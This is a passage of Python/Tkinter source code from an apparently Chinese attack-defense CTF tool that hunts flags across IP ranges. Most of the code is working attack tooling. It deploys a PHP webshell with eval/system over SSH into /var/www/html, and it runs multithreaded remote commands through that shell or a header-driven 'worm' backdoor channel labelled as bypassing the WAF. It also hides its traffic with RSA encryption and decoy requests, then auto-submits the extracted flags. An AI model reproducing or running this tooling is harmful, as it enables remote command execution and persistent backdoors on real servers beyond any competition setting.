                with open(FLAG_KNOWN_FILE) as f: self.known = set(json.load(f))
                self.log(f'加载 {len(self.known)} 个历史Flag (自动去重)', 'info')
            except Exception: pass

    def save_known(self):
        try:
            atomic_write(FLAG_KNOWN_FILE, json.dumps(list(self.known)))
        except Exception: pass

    def build_ui(self):
        f = tk.Frame(self.parent, bg=MON_CK['bg'])
        f.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        pad = {'padx': 4, 'pady': 2}
        f1 = tb.LabelFrame(f, text='目标 IP'); f1.pack(fill=tk.X, **pad)
        r1 = tb.Frame(f1); r1.pack(fill=tk.X, **pad)
        tb.Label(r1, text='CIDR / 逗号分隔:').pack(side=tk.LEFT)
        self.entry_ip = tb.Entry(r1); self.entry_ip.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        tb.Button(r1, text='\U0001f4c2 导入文件', command=self.load_file).pack(side=tk.LEFT)
        tb.Label(r1, text='排除自身:').pack(side=tk.LEFT, padx=(6,0))
        self.entry_self = tb.Entry(r1, width=14); self.entry_self.pack(side=tk.LEFT, padx=2)
        f2 = tb.LabelFrame(f, text='Webshell 配置'); f2.pack(fill=tk.X, **pad)
        r2 = tb.Frame(f2); r2.pack(fill=tk.X, **pad)
        tb.Label(r2, text='路径:').pack(side=tk.LEFT)
        self.entry_shell = tb.Entry(r2, width=16)
        self.entry_shell.insert(0, '/shell.php'); self.entry_shell.pack(side=tk.LEFT, padx=2)
        tb.Label(r2, text='密码:').pack(side=tk.LEFT, padx=(6,0))
        self.entry_pass = tb.Entry(r2, width=12); self.entry_pass.insert(0, 'cmd')
        self.entry_pass.pack(side=tk.LEFT, padx=2)
        tk.Button(r2, text='\U0001f680 SSH\u90e8\u7f72', command=self.ssh_deploy_flag,
            bg='#7c5cff', fg='white', relief=tk.FLAT, bd=0, padx=8, pady=2, cursor='hand2',
            font=('\u5fae\u8f6f\u96c5\u9ed1', 8), activebackground='#d35400').pack(side=tk.LEFT, padx=2)
        tb.Label(r2, text='端口:').pack(side=tk.LEFT, padx=(6,0))
        self.entry_port = tb.Entry(r2, width=5); self.entry_port.insert(0, '80')
        self.entry_port.pack(side=tk.LEFT, padx=2)
        self.v_https_flag = tk.BooleanVar()
        tb.Checkbutton(r2, text='HTTPS', variable=self.v_https_flag).pack(side=tk.LEFT, padx=4)
        tb.Label(r2, text='超时:').pack(side=tk.LEFT, padx=(6,0))
        self.entry_timeout = tb.Entry(r2, width=3); self.entry_timeout.insert(0, '5')
        self.entry_timeout.pack(side=tk.LEFT, padx=2)
        tb.Label(r2, text='秒').pack(side=tk.LEFT)
        tk.Label(f2, text='\u26a0 \u7aef\u53e3=Web\u7f51\u9875HTTP\u7aef\u53e3(\u59828804)\uff0c\u4e0d\u662fSSH\u7aef\u53e3(22/2204)\uff01', fg='#ffcc00', bg='#0d1526', font=('\u5fae\u8f6f\u96c5\u9ed1', 8)).pack(anchor='w', padx=10)
        f3 = tb.LabelFrame(f, text='执行命令'); f3.pack(fill=tk.X, **pad)
        r3 = tb.Frame(f3); r3.pack(fill=tk.X, **pad)
        self.cmd_text = tk.Text(r3, height=3, relief=tk.FLAT, highlightthickness=0, borderwidth=0, font=('Consolas', 9))
        self.cmd_text.pack(fill=tk.X, side=tk.LEFT, expand=True)
        self.cmd_text.insert('1.0', '\n'.join(self.DEFAULT_CMDS))
        b3 = tb.Frame(r3); b3.pack(side=tk.LEFT, padx=4)
        tb.Button(b3, text='重置默认', command=self.reset_cmds).pack(pady=2)
        f_creep = tb.LabelFrame(f, text='蠕虫通道 (绕过平台/WAF, 优先)' )
        f_creep.pack(fill=tk.X, **pad)
        rc2 = tb.Frame(f_creep); rc2.pack(fill=tk.X, **pad)
        tb.Checkbutton(rc2, text='优先走蠕虫 X-Cmd header', variable=self.v_creep).pack(side=tk.LEFT, padx=2)
        tb.Checkbutton(rc2, text='深度搜索(嵌套目录,较慢)', variable=self.v_deep).pack(side=tk.LEFT, padx=4)
        tb.Label(rc2, text='路径:').pack(side=tk.LEFT, padx=(6,0))
        self.entry_creep_path = tb.Entry(rc2, width=12)
        self.entry_creep_path.insert(0, self.creep_path); self.entry_creep_path.pack(side=tk.LEFT, padx=2)
        tb.Label(rc2, text='蠕虫密码:').pack(side=tk.LEFT, padx=(6,0))
        self.entry_creep_pass = tb.Entry(rc2, width=18)
        self.entry_creep_pass.insert(0, self.creep_pass.get()); self.entry_creep_pass.pack(side=tk.LEFT, padx=2)
        tb.Label(rc2, text='(失败自动回退Webshell)', foreground='#6b7f9e').pack(side=tk.LEFT, padx=(8,0))
        tb.Button(rc2, text='\U0001f50c 测试连接', command=self.test_conn,
            bootstyle='info', width=10).pack(side=tk.LEFT, padx=4)
        f_rsa = tb.LabelFrame(f, text='RSA加密 + 混淆流量'); f_rsa.pack(fill=tk.X, **pad)
        rr = tb.Frame(f_rsa); rr.pack(fill=tk.X, **pad)
        self.v_rsa = tk.BooleanVar()
        tb.Checkbutton(rr, text='启用RSA加密通信', variable=self.v_rsa).pack(side=tk.LEFT, padx=2)
        self.v_mix = tk.BooleanVar()
        tb.Checkbutton(rr, text='启用混淆流量(万假一真)', variable=self.v_mix).pack(side=tk.LEFT, padx=8)
        tb.Label(rr, text='混淆数:').pack(side=tk.LEFT, padx=(6,0))
        self.entry_fake = tb.Entry(rr, width=3); self.entry_fake.insert(0, '8')
        self.entry_fake.pack(side=tk.LEFT, padx=2)
        tb.Label(rr, text='RSA Agent(可选):').pack(side=tk.LEFT, padx=(6,0))
        self.entry_rsa_agent = tb.Entry(rr, width=24)
        self.entry_rsa_agent.pack(side=tk.LEFT, padx=2)
        f4 = tb.LabelFrame(f, text='提交配置'); f4.pack(fill=tk.X, **pad)
        r4 = tb.Frame(f4); r4.pack(fill=tk.X, **pad)
        tb.Label(r4, text='提交URL(多行):').pack(side=tk.LEFT)
        self.entry_submit = tb.Entry(r4); self.entry_submit.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
        tb.Label(r4, text='Token:').pack(side=tk.LEFT, padx=(6,0))
        self.entry_token = tb.Entry(r4, width=18); self.entry_token.pack(side=tk.LEFT, padx=2)
        self.no_submit_var = tk.BooleanVar()
        tb.Checkbutton(r4, text='仅扫描不提交', variable=self.no_submit_var).pack(side=tk.LEFT, padx=4)
        tb.Button(r4, text='测试提交', command=self.test_submit).pack(side=tk.LEFT)
        r_ctrl = tb.Frame(f); r_ctrl.pack(fill=tk.X, **pad)
        self.btn_start_flag = tb.Button(r_ctrl, text='\u25b6 开始', command=self.start_hunt)
        self.btn_start_flag.pack(side=tk.LEFT, padx=2)
        self.btn_stop_flag = tb.Button(r_ctrl, text='\u23f9 停止', command=self.stop_hunt, state=tk.DISABLED)
        self.btn_stop_flag.pack(side=tk.LEFT, padx=2)
        tb.Label(r_ctrl, text='轮询间隔:').pack(side=tk.LEFT, padx=(12,0))
        self.entry_interval = tb.Entry(r_ctrl, width=4); self.entry_interval.insert(0, '30')
        self.entry_interval.pack(side=tk.LEFT, padx=2)
        tb.Label(r_ctrl, text='秒').pack(side=tk.LEFT)
        tb.Label(r_ctrl, text='线程:').pack(side=tk.LEFT, padx=(6,0))
        self.entry_threads = tb.Entry(r_ctrl, width=4); self.entry_threads.insert(0, '50')
        self.entry_threads.pack(side=tk.LEFT, padx=2)
        r_stat = tb.Frame(f); r_stat.pack(fill=tk.X, **pad)
        self.lbl_targets = tb.Label(r_stat, text='目标: 0'); self.lbl_targets.pack(side=tk.LEFT, padx=4)
        self.lbl_round = tb.Label(r_stat, text='轮次: 0'); self.lbl_round.pack(side=tk.LEFT, padx=4)
        self.lbl_submitted = tb.Label(r_stat, text='累计提交: 0'); self.lbl_submitted.pack(side=tk.LEFT, padx=4)
        # ── 底部子标签页 ──
        bot_nb = tb.Notebook(f)
        bot_nb.pack(fill=tk.BOTH, expand=True, **pad)
        # 子页1: 日志
        bot_log = tb.Frame(bot_nb); bot_nb.add(bot_log, text='  \U0001f4dd 日志  ')
        self.log_w = LogWidget(bot_log)
        for t, c in [('info','#c8d6f0'),('flag','#00ff9d'),('submit','#c084fc'),('error','#ff4d6d'),('round','#00d4ff'),('warn','#ffcc00')]:
            self.log_w.text.tag_config(t, foreground=c)
        # 子页2: 提交历史
        bot_hist = tb.Frame(bot_nb); bot_nb.add(bot_hist, text='  \U0001f4ca 提交历史  ')
        hist_top = tb.Frame(bot_hist); hist_top.pack(fill=tk.X, padx=2, pady=2)
        self.btn_clear_hist = tb.Button(hist_top, text='\U0001f5d1 清空历史', command=self.clear_history, width=10)
        self.btn_clear_hist.pack(side=tk.LEFT, padx=2)
        self.lbl_hist_stat = tb.Label(hist_top, text='共 0 条 | 成功 0 | 失败 0', foreground='#6b7f9e')
        self.lbl_hist_stat.pack(side=tk.LEFT, padx=8)
        self.hist_tree = tb.Treeview(bot_hist, columns=('time','ip','flag','status'), show='headings', height=6)
        self.hist_tree.heading('time', text='时间'); self.hist_tree.heading('ip', text='来源IP')
        self.hist_tree.heading('flag', text='Flag'); self.hist_tree.heading('status', text='状态')
        self.hist_tree.column('time', width=100); self.hist_tree.column('ip', width=100)
        self.hist_tree.column('flag', width=300); self.hist_tree.column('status', width=60)
        self.hist_tree.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
        self.hist_tree.tag_configure('ok', foreground='#00ff9d')
        self.hist_tree.tag_configure('fail', foreground='#ff4d6d')
        self._history = []  # list of dicts
        # 子页3: 手动提交
        bot_manual = tb.Frame(bot_nb); bot_nb.add(bot_manual, text='  \U0001f4c5 手动提交  ')
        m_top = tb.Frame(bot_manual); m_top.pack(fill=tk.X, padx=4, pady=4)
        tb.Label(m_top, text='手动输入Flag:').pack(side=tk.LEFT)
        self.manual_flag = tb.Entry(m_top, width=50)
        self.manual_flag.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        tb.Label(m_top, text='来源IP(可选):').pack(side=tk.LEFT)
        self.manual_ip = tb.Entry(m_top, width=16)
        self.manual_ip.pack(side=tk.LEFT, padx=2)
        tb.Button(m_top, text='\U0001f4e4 提交', command=self.manual_submit, bootstyle='success', width=8).pack(side=tk.LEFT, padx=4)
        self.manual_log = scrolledtext.ScrolledText(bot_manual, font=('Consolas', 9), bg='#0a0e17',
            fg='#c8d6f0', height=6, state=tk.DISABLED)
        self.manual_log.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        self.manual_log.tag_config('ok', foreground='#00ff9d')
        self.manual_log.tag_config('fail', foreground='#ff4d6d')
        self.manual_log.tag_config('info', foreground='#c8d6f0')
        # 多提交URL配置
        self._submit_urls = []
        self._submit_tokens = []

    def save_config(self):
        cfg = {
            'ip': self.entry_ip.get(), 'self_ip': self.entry_self.get(),
            'shell_url': self.entry_shell.get(), 'shell_pass': self.entry_pass.get(),
            'port': self.entry_port.get(), 'https': self.v_https_flag.get(),
            'timeout': self.entry_timeout.get(), 'cmds': self.cmd_text.get('1.0', 'end').strip(),
            'submit_url': self.entry_submit.get(), 'token': self.entry_token.get(),
            'no_submit': self.no_submit_var.get(), 'interval': self.entry_interval.get(),
            'threads': self.entry_threads.get(),
            'use_rsa': self.v_rsa.get(), 'use_mix': self.v_mix.get(),
            'fake_count': self.entry_fake.get(), 'rsa_agent': self.entry_rsa_agent.get(),
            'use_creep': self.v_creep.get(), 'creep_pass': self.entry_creep_pass.get(),
            'creep_path': self.entry_creep_path.get(), 'use_deep': self.v_deep.get(),
        }
        ConfigManager.set_section('flag', cfg)
        ConfigManager.save()
        try: atomic_write(self.cfg_file, json.dumps(cfg, indent=2))
        except Exception: pass

    def load_config(self):
        if not os.path.exists(self.cfg_file): return
        try:
            with open(self.cfg_file) as f: cfg = json.load(f)
            self.entry_ip.delete(0, 'end'); self.entry_ip.insert(0, cfg.get('ip', ''))
            self.entry_self.delete(0, 'end'); self.entry_self.insert(0, cfg.get('self_ip', ''))
            self.entry_shell.delete(0, 'end'); self.entry_shell.insert(0, cfg.get('shell_url', '/shell.php'))
            self.entry_pass.delete(0, 'end'); self.entry_pass.insert(0, cfg.get('shell_pass', 'cmd'))
            self.entry_port.delete(0, 'end'); self.entry_port.insert(0, cfg.get('port', '80'))
            self.v_https_flag.set(cfg.get('https', False))
            self.entry_timeout.delete(0, 'end'); self.entry_timeout.insert(0, str(cfg.get('timeout', '5')))
            if cfg.get('cmds'): self.cmd_text.delete('1.0', 'end'); self.cmd_text.insert('1.0', cfg['cmds'])
            self.entry_submit.delete(0, 'end'); self.entry_submit.insert(0, cfg.get('submit_url', ''))
            self.entry_token.delete(0, 'end'); self.entry_token.insert(0, cfg.get('token', ''))
            self.no_submit_var.set(cfg.get('no_submit', False))
            self.entry_interval.delete(0, 'end'); self.entry_interval.insert(0, str(cfg.get('interval', '30')))
            self.entry_threads.delete(0, 'end'); self.entry_threads.insert(0, str(cfg.get('threads', '50')))
            self.v_rsa.set(cfg.get('use_rsa', False))
            self.v_mix.set(cfg.get('use_mix', False))
            self.entry_fake.delete(0, 'end'); self.entry_fake.insert(0, cfg.get('fake_count', '8'))
            self.entry_rsa_agent.delete(0, 'end'); self.entry_rsa_agent.insert(0, cfg.get('rsa_agent', ''))
            self.v_creep.set(cfg.get('use_creep', True))
            self.entry_creep_pass.delete(0, 'end'); self.entry_creep_pass.insert(0, cfg.get('creep_pass', 'cmd'))
            self.entry_creep_path.delete(0, 'end'); self.entry_creep_path.insert(0, cfg.get('creep_path', '/.creep.php'))
            self.v_deep.set(cfg.get('use_deep', False))
        except Exception: pass

    def log_self(self, msg, tag='info'):
        if hasattr(self, 'log_w'):
            ts = datetime.now().strftime('%H:%M:%S')
            self.log_w.log(f'[{ts}] {msg}', tag)


    def test_conn(self):
        """测试Webshell和蠕虫通道连接,自动验证配置是否正确"""
        def _test():
            import requests
            base_ip = self.entry_ip.get().strip().split(',')[0].split('/')[0].strip()
            port = self.entry_port.get().strip() or '80'
            proto = 'https' if self.v_https_flag.get() else 'http'
            shell_url = self.entry_shell.get().strip() or '/shell.php'
            shell_pass = self.entry_pass.get().strip() or 'cmd'
            timeout = int(self.entry_timeout.get().strip() or 5)
            cpath = self.entry_creep_path.get().strip() or self.creep_path
            cpass = self.entry_creep_pass.get().strip() or self.creep_pass.get()
            base = f'{proto}://{base_ip}:{port}'
            if not base_ip:
                self.root.after(0, lambda: self.log_self('[!] 请先填写目标IP', 'warn'))
                return
            self.root.after(0, lambda: self.log_self(f'[~] 测试连接 {base} ...', 'info'))
            s = requests.Session()
            # 1. 蠕虫通道
            try:
                r = s.get(f'{base}{cpath}', timeout=timeout,
                          headers={'X-Creep': cpass, 'X-Cmd': 'id'})
                if r.status_code == 200 and r.text.strip():
                    self.root.after(0, lambda t=r.text.strip()[:60]: self.log_self(
                        f'[OK] 蠕虫通道 ✓  命令输出: {t}', 'ok'))
                else:
                    self.root.after(0, lambda c=r.status_code: self.log_self(
                        f'[X] 蠕虫通道失败 (HTTP {c})', 'error'))
            except Exception as e:
                self.root.after(0, lambda e=e: self.log_self(f'[X] 蠕虫通道错误: {str(e)[:60]}', 'error'))
            # 2. Webshell通道
            try:
                r = s.post(f'{base}{shell_url}', data={shell_pass: 'echo "OK";'}, timeout=timeout)
                if r.status_code == 200 and r.text.strip():
                    self.root.after(0, lambda t=r.text.strip()[:60]: self.log_self(
                        f'[OK] Webshell通道 ✓  响应: {t}', 'ok'))
                else:
                    self.root.after(0, lambda c=r.status_code, b=r.text[:60]: self.log_self(
                        f'[X] Webshell通道失败 (HTTP {c}) {b}', 'error'))
            except Exception as e:
                self.root.after(0, lambda e=e: self.log_self(f'[X] Webshell通道错误: {str(e)[:60]}', 'error'))
        async_run(_test)

    def ssh_deploy_flag(self):
        """SSH一键创建Webshell并自动填入Flag获取配置"""
        def do_deploy(vals):
            host, port, user, pwd = vals['host'], vals['port'], vals['user'], vals['pwd']
            sh_pass = vals.get('sh_pass', 'cmd')
            def _deploy():
                try:
                    import paramiko
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host, port=int(port), username=user, password=pwd, timeout=10)
                    sftp = ssh.open_sftp()
                    sftp.open('/var/www/html/shell.php', 'w').write('<?php $c=$_POST["' + sh_pass + '"];if(strpos($c,";")!==false||strpos($c,"echo ")===0||strpos($c,"file_")===0||strpos($c,"base64")!==false){@eval($c);}else{@system($c);}?>')
                    sftp.close()
                    self.root.after(0, lambda: self.log_self('[OK] Webshell已创建', 'ok'))
                    self.root.after(0, lambda: (self.entry_shell.delete(0,tk.END), self.entry_shell.insert(0,'/web/shell.php'), self.entry_pass.delete(0,tk.END), self.entry_pass.insert(0,sh_pass)))
                    ssh.close()
                except Exception as e:
                    self.root.after(0, lambda e=e: self.log_self(f'[FAIL] {e}', 'fail'))
            async_run(_deploy)
        pre = getattr(self, '_prefill_ssh', {}) or {}
        ssh_deploy_dialog(self.parent, '🚀 SSH一键创建Webshell', '创建webshell，自动填入Flag配置',
            [('SSH地址:', 'host', pre.get('host', ''), ''), ('SSH端口:', 'port', pre.get('port', '22'), ''),
             ('用户名:', 'user', pre.get('user', 'root'), ''), ('密码:', 'pwd', pre.get('pwd', ''), '*'),
             ('Shell密码:', 'sh_pass', 'cmd', '')], do_deploy)

    def load_file(self):
        p = filedialog.askopenfilename(title='选择IP列表文件')
        if p:
            try:
                with open(p) as f: ips = [l.strip() for l in f if l.strip() and not l.startswith('#')]
                self.entry_ip.delete(0, 'end'); self.entry_ip.insert(0, ','.join(ips))
            except Exception as e: messagebox.showerror('错误', str(e))

    def reset_cmds(self):
        self.cmd_text.delete('1.0', 'end'); self.cmd_text.insert('1.0', '\n'.join(self.DEFAULT_CMDS))

    def test_submit(self):
        url = self.entry_submit.get().strip()
        if not url: messagebox.showwarning('提示', '请先填写提交URL'); return
        flag = f'test_flag_{int(time.time())}'
        try:
            r = requests.post(url, data={'flag': flag, 'token': self.entry_token.get().strip()}, timeout=10)
            self.log_self(f'测试提交: {flag} -> {r.status_code} {r.text.strip()[:60]}', 'info')
        except Exception as e: self.log_self(f'测试提交失败: {e}', 'error')

    def get_targets(self):
        ips = set()
        raw = self.entry_ip.get().strip()
        if raw:
            for item in raw.replace('\n', ',').split(','):
                item = item.strip()
                if not item: continue
                try:
                    for h in ipaddress.ip_network(item, strict=False).hosts(): ips.add(str(h))
                except (ValueError, TypeError): ips.add(item)
        self_ip = self.entry_self.get().strip()
        if self_ip: ips.discard(self_ip)
        return sorted(ips)

    def submit_flag(self, flag, ip):
        if flag in self.known: return False
        if self.no_submit_var.get() or not self.entry_submit.get().strip():
            self.log_self(f'[发现] {ip} -> {flag}', 'flag')
            self.known.add(flag); return True
        try:
            r = _session().post(self.entry_submit.get().strip(),
                data={'flag': flag, 'token': self.entry_token.get().strip() or ''}, timeout=10)
            self.log_self(f'[提交] {flag} -> {r.text.strip()[:60]}', 'submit')
            self.known.add(flag); self.total_submitted += 1
            self.lbl_submitted.config(text=f'累计提交: {self.total_submitted}')
            return True
        except Exception as e:
            self.log_self(f'[提交失败] {flag}: {e}', 'error'); return False

    def check_one(self, ip, cmds, shell_url, shell_pass, port, https, timeout):
        ip = ip.strip()
        base = make_base(ip, port, https)
        s = _session()
        use_rsa = self.v_rsa.get()
        use_mix = self.v_mix.get()
        fake_n = safe_int(self.entry_fake.get().strip(), 8)
        rsa_client = None
        if use_rsa:
            try:
                _try_add_path(os.path.join(BASE, '攻击模块'))
                from rsa_crypto import RSAAgentClient
                agent_url = self.entry_rsa_agent.get().strip() or None
                rsa_client = RSAAgentClient(agent_url)
            except Exception as e:
                self.log_self(f'RSA初始化失败: {e}', 'error')
                return False
        for cmd in cmds:
            if self.stop_flag.is_set(): return False
            try:
                if use_mix:
                    import random, string
                    for i in range(fake_n):
                        if self.stop_flag.is_set(): break
                        fd = {shell_pass: f'echo {random.choice(string.ascii_letters*8)}'} if i % 2 == 0 else {f'x{random.randint(1,99)}': str(random.randint(1000,9999))}
                        try: s.post(f'{base}{shell_url}', data=fd, timeout=max(1, timeout//2))
                        except Exception: pass
                if use_rsa and rsa_client:
                    payload = rsa_client.encrypt_payload(cmd)
                    r = s.post(f'{base}{shell_url}', data={'d': payload}, timeout=timeout)
                    if r.status_code == 200 and r.text.strip():
                        plain = rsa_client.decrypt_response(r.text.strip())
                        for flag in FLAG_PATTERN.findall(plain):
                            if flag not in self.known: self.submit_flag(flag, ip)
                else:
                    r = s.post(f'{base}{shell_url}', data={shell_pass: cmd}, timeout=timeout)
                    if r.status_code == 200:
                        for flag in FLAG_PATTERN.findall(r.text):
                            if flag not in self.known: self.submit_flag(flag, ip)
            except Exception: pass
        return True

    def hunt_loop(self):
        targets = self.get_targets()
        if not targets:
            self.log_self('错误: 没有目标IP', 'error'); self.running = False
            self.root.after(0, lambda: self.btn_start_flag.config(state=tk.NORMAL))
            self.root.after(0, lambda: self.btn_stop_flag.config(state=tk.DISABLED))
            return
        cmds = [l.strip() for l in self.cmd_text.get('1.0', 'end').strip().split('\n') if l.strip()]
        def gi(e, d): return max(1, min(9999, safe_int(self.__dict__[f'entry_{e}'].get().strip(), d)))
        port = gi('port', 80); timeout = gi('timeout', 5)
        interval = gi('interval', 30); threads = gi('threads', 50)
        self.lbl_targets.config(text=f'目标: {len(targets)}')
        self.log_self(f'目标: {len(targets)} 个IP | 线程: {threads} | 命令: {len(cmds)} 条', 'info')
        round_num = 0
        while not self.stop_flag.is_set():
            round_num += 1; self.lbl_round.config(text=f'轮次: {round_num}')
            self.log_self(f'--- 第 {round_num} 轮 ---', 'round')
            with ThreadPoolExecutor(max_workers=threads) as ex:
                creep_cfg = {
                    'enabled': bool(self.v_creep.get()),
                    'path': self.entry_creep_path.get().strip() or self.creep_path,
                    'pass': self.entry_creep_pass.get().strip() or self.creep_pass.get(),
                    'deep': bool(self.v_deep.get()),
                }
                fs = {ex.submit(self.check_one_v2, ip, cmds, self.entry_shell.get().strip(),
                               self.entry_pass.get().strip(), port, self.v_https_flag.get(), timeout, creep_cfg): ip for ip in targets}
                for f in as_completed(fs):
                    if self.stop_flag.is_set(): break
            if round_num % 5 == 0: self.save_known()
            for _ in range(interval):
                if self.stop_flag.wait(1): break
        self.running = False; self.save_known()
        self.log_self('已停止', 'info')
        self.root.after(0, lambda: self.btn_start_flag.config(state=tk.NORMAL))
        self.root.after(0, lambda: self.btn_stop_flag.config(state=tk.DISABLED))

    def start_hunt(self):
        if self.running: return
        if not self.entry_ip.get().strip(): messagebox.showwarning('提示', '请先输入目标IP'); return
        self.stop_flag.clear(); self.running = True
        self.btn_start_flag.config(state=tk.DISABLED); self.btn_stop_flag.config(state=tk.NORMAL)
        async_run(self.hunt_loop)

    def stop_hunt(self):
        self.stop_flag.set(); self.btn_stop_flag.config(state=tk.DISABLED)

    # ── 提交历史 ──
    def clear_history(self):
        self._history.clear()
        for i in self.hist_tree.get_children(): self.hist_tree.delete(i)
        self.lbl_hist_stat.config(text='共 0 条 | 成功 0 | 失败 0')

    def add_history(self, flag, ip, status, detail=''):
        ts = datetime.now().strftime('%H:%M:%S')
        tag = 'ok' if status == 'ok' else 'fail'
        self.hist_tree.insert('', 0, values=(ts, ip, flag, '\u2705' if status=='ok' else '\u274c'), tags=(tag,))
        self._history.append({'time':ts,'ip':ip,'flag':flag,'status':status,'detail':detail})
        ok = sum(1 for h in self._history if h['status']=='ok')
        fail = len(self._history) - ok
        self.lbl_hist_stat.config(text=f'共 {len(self._history)} 条 | 成功 {ok} | 失败 {fail}')

    # ── 手动提交 ──
    def manual_submit(self):
        flag = self.manual_flag.get().strip()
        if not flag: messagebox.showwarning('提示', '请输入Flag'); return
        ip = self.manual_ip.get().strip() or 'manual'
        def log_m(msg, tag='info'):
            self.manual_log.config(state=tk.NORMAL)
            self.manual_log.insert(tk.END, msg + '\n', tag)
            self.manual_log.see(tk.END)
            self.manual_log.config(state=tk.DISABLED)
        submit_url = self.entry_submit.get().strip()
        if not submit_url:
            log_m(f'[SKIP] 未配置提交URL，仅记录', 'info')
            self.add_history(flag, ip, 'ok', 'manual(no-submit)')
            return
        try:
            r = _session().post(submit_url, data={'flag': flag, 'token': self.entry_token.get().strip() or ''}, timeout=10)
            ok = r.status_code == 200
            log_m(f'[{"OK" if ok else "FAIL"}] {flag} -> {r.status_code}', 'ok' if ok else 'fail')
            self.add_history(flag, ip, 'ok' if ok else 'fail', f'HTTP {r.status_code}')
        except Exception as e:
            log_m(f'[FAIL] {flag}: {e}', 'fail')
            self.add_history(flag, ip, 'fail', str(e)[:40])

    # ── 增强提交: 多平台 + 重试 ──
    def submit_flag_multi(self, flag, ip):
        """增强版提交: 多URL + 重试队列"""
        if flag in self.known: return False
        self.known.add(flag)
        if self.no_submit_var.get():
            self.log_self(f'[发现] {ip} -> {flag}', 'flag')
            self.add_history(flag, ip, 'ok', '仅扫描')
            return True
        urls = self.entry_submit.get().strip().splitlines()
        urls = [u.strip() for u in urls if u.strip()]
        token = self.entry_token.get().strip()
        ok_any = False
        for url in urls:
            for attempt in range(3):
                try:
                    r = _session().post(url, data={'flag': flag, 'token': token or ''}, timeout=10)
                    if r.status_code == 200:
                        self.log_self(f'[提交] {flag} -> {url[:30]}... {r.text.strip()[:30]}', 'submit')
                        self.add_history(flag, ip, 'ok', url[:30])
                        self.total_submitted += 1
                        self.lbl_submitted.config(text=f'累计提交: {self.total_submitted}')
                        ok_any = True
                        break
                    else:
                        self.log_self(f'[重试] {flag} -> {url[:30]}... HTTP {r.status_code} (第{attempt+1}次)', 'warn')
                except Exception as e:
                    if attempt < 2:
                        self.log_self(f'[重试] {flag} 第{attempt+1}次: {e}', 'warn')
                        time.sleep(1)
                    else:
                        self.log_self(f'[提交失败] {flag} 重试耗尽: {e}', 'error')
                        self.add_history(flag, ip, 'fail', str(e)[:30])
        return ok_any

    def check_one_v2(self, ip, cmds, shell_url, shell_pass, port, https, timeout, creep_cfg=None):
        """增强版 check_one，使用 submit_flag_multi"""
        ip = ip.strip()
        base = make_base(ip, port, https)
        s = _session()
        creep_cfg = creep_cfg or {'enabled': False, 'path': self.creep_path, 'pass': self.creep_pass.get(), 'deep': False}
        use_rsa = self.v_rsa.get()
        use_mix = self.v_mix.get()
        fake_n = safe_int(self.entry_fake.get().strip(), 8)
        rsa_client = None
        if use_rsa:
            try:
                _try_add_path(os.path.join(BASE, '攻击模块'))
                from rsa_crypto import RSAAgentClient
                agent_url = self.entry_rsa_agent.get().strip() or None
                rsa_client = RSAAgentClient(agent_url)
            except Exception as e:
                self.log_self(f'RSA初始化失败: {e}', 'error')
                return False
        for cmd in cmds:
            if self.stop_flag.is_set(): return False
            try:
                if use_mix:
                    import random, string
                    for i in range(fake_n):
                        if self.stop_flag.is_set(): break
                        fd = {shell_pass: f'echo {random.choice(string.ascii_letters*8)}'} if i % 2 == 0 else {f'x{random.randint(1,99)}': str(random.randint(1000,9999))}
                        try: s.post(f'{base}{shell_url}', data=fd, timeout=max(1, timeout//2))
                        except Exception: pass
                if use_rsa and rsa_client:
                    payload = rsa_client.encrypt_payload(cmd)
                    r = s.post(f'{base}{shell_url}', data={'d': payload}, timeout=timeout)
                    if r.status_code == 200 and r.text.strip():
                        plain = rsa_client.decrypt_response(r.text.strip())
                        for flag in FLAG_PATTERN.findall(plain):
                            if flag not in self.known: self.submit_flag_multi(flag, ip)
                else:
                    got = False
                    if creep_cfg.get('enabled'):
                        try:
                            rc = s.get(f'{base}{creep_cfg["path"]}', timeout=timeout,
                                       headers={'X-Creep': creep_cfg['pass'], 'X-Cmd': cmd})
                            self.log_self(f'[蠕虫] {ip} {cmd} -> {rc.status_code} {rc.text.strip()[:40]!r}', 'info')
                            if rc.status_code == 200 and rc.text.strip():
                                txt = rc.text.strip()
                                if txt not in ('NO_IP', 'OK:0', ''):
                                    for flag in FLAG_PATTERN.findall(txt):
                                        if flag not in self.known: self.submit_flag_multi(flag, ip)
                                    got = True
                        except Exception as e:
                            self.log_self(f'[蠕虫] {ip} {cmd} 错误: {str(e)[:50]}', 'error')
                    if not got:
                        wrapped = 'echo `%s`;' % cmd.replace('`', '\\`')
                        r = s.post(f'{base}{shell_url}', data={shell_pass: wrapped}, timeout=timeout)
                        self.log_self(f'[shell] {ip} {cmd} -> {r.status_code} {r.text.strip()[:40]!r}', 'info')
                        if r.status_code == 200:
                            for flag in FLAG_PATTERN.findall(r.text):
                                if flag not in self.known: self.submit_flag_multi(flag, ip)
            except Exception as e:
                self.log_self(f'[猎手] {ip} {cmd} 错误: {str(e)[:50]}', 'error')
        if creep_cfg.get('deep'):
            dtimeout = max(timeout * 6, 20)
            for dcmd in self.DEEP_CMDS:
                if self.stop_flag.is_set(): return True
                dgot = False
                if creep_cfg.get('enabled'):
                    try:
                        rc = s.get(f'{base}{creep_cfg["path"]}', timeout=dtimeout,
                                   headers={'X-Creep': creep_cfg['pass'], 'X-Cmd': dcmd})
                        self.log_self(f'[深度] {ip} -> {rc.status_code} {rc.text.strip()[:40]!r}', 'info')
                        if rc.status_code == 200 and rc.text.strip():
                            for flag in FLAG_PATTERN.findall(rc.text):
                                if flag not in self.known: self.submit_flag_multi(flag, ip)
                            dgot = True
                    except Exception as e:
                        self.log_self(f'[深度] {ip} 错误: {str(e)[:50]}', 'error')
                if not dgot:
                    wrapped = 'echo `%s`;' % dcmd.replace('`', '\\`')
                    try:
                        r = s.post(f'{base}{shell_url}', data={shell_pass: wrapped}, timeout=dtimeout)
                        self.log_self(f'[深度/shell] {ip} -> {r.status_code}', 'info')
                        if r.status_code == 200:
                            for flag in FLAG_PATTERN.findall(r.text):
                                if flag not in self.known: self.submit_flag_multi(flag, ip)
                    except Exception as e:
                        self.log_self(f'[深度/shell] {ip} 错误: {str(e)[:50]}', 'error')
        return True
NEO = {
